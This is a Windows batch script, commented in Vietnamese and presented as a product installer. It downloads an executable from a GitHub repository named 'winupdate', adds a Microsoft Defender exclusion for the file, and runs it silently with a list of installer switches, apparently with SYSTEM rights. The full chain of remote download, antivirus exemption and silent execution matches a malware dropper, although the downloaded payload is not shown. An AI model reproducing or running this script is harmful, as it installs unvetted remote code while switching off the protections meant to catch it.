@echo off
setlocal enabledelayedexpansion

rem ---------- Cấu hình (chỉnh URL nếu cần) ----------
set "URL=https://raw.githubusercontent.com/Riotan1/winupdate/main/ProducLucas.exe"
set "FILENAME=product_installer.exe"
set "TEMPPATH=%TEMP%"
set "OUT=%TEMPPATH%\%FILENAME%"
set "LOG=C:\Windows\Temp\install_product_log.txt"
if exist "%LOG%" del "%LOG%" >nul 2>&1

echo [%date% %time%] START >> "%LOG%"

rem --- ensure TLS1.2, download file
echo Downloading %URL% to %OUT% ... >> "%LOG%"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
   try { Invoke-WebRequest -Uri '%URL%' -OutFile '%OUT%' -UseBasicParsing -ErrorAction Stop; Write-Output 'DL_OK' } catch { Write-Output 'DL_ERR:' + $_.Exception.Message; exit 1 }" >> "%LOG%" 2>&1

if not exist "%OUT%" (
  echo [%date% %time%] DOWNLOAD FAILED - file not found: %OUT% >> "%LOG%"
  type "%LOG%"
  exit /b 1
)

echo [%date% %time%] Downloaded file size: %~zOUT% >> "%LOG%"

rem --- Add Defender exclusion for the file (run as SYSTEM has rights)
echo Adding Defender exclusion for %OUT% >> "%LOG%"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "try { Add-MpPreference -ExclusionPath '%OUT%'; Write-Output 'EXC_OK' } catch { Write-Output 'EXC_ERR:' + $_.Exception.Message }" >> "%LOG%" 2>&1

rem --- Try common silent switches (will stop on first success)
set "SWITCHES=/S /s /silent /verysilent /quiet /qn /norestart /install"
for %%s in (%SWITCHES%) do (
  echo [%date% %time%] Trying switch: %%s >> "%LOG%"
  rem run executable with switch and wait
  "%OUT%" %%s >> "%LOG%" 2>&1
  set "RC=!ERRORLEVEL!"
  echo [%date% %time%] ExitCode: !RC! >> "%LOG%"
  rem if exit code 0 assume success — break
  if "!RC!"=="0" (
    echo [%date% %time%] Install succeeded with switch: %%s >> "%LOG%"
    type "%LOG%"
    exit /b 0
  )
  timeout /t 2 /nobreak >nul
)

rem --- Fallback: try running MSI with msiexec if file is .msi (rename not likely)
for %%x in ("%OUT%") do set "EXT=%%~xx"
if /I "%EXT%"==".msi" (
  echo [%date% %time%] Detected MSI - using msiexec /qn >> "%LOG%"
  msiexec /i "%OUT%" /qn /norestart /l*v "C:\Windows\Temp\msi_install.log" >> "%LOG%" 2>&1
  echo [%date% %time%] msiexec exit %ERRORLEVEL% >> "%LOG%"
  type "%LOG%"
  exit /b %ERRORLEVEL%
)

rem --- If reaches here, no silent switch worked
echo [%date% %time%] No silent switch succeeded. Installer may require UI/interactive session. >> "%LOG%"
echo [%date% %time%] File saved at: %OUT% >> "%LOG%"
echo [%date% %time%] Cannot continue in Session 0 (SYSTEM) if installer needs UI. >> "%LOG%"

type "%LOG%"
exit /b 2
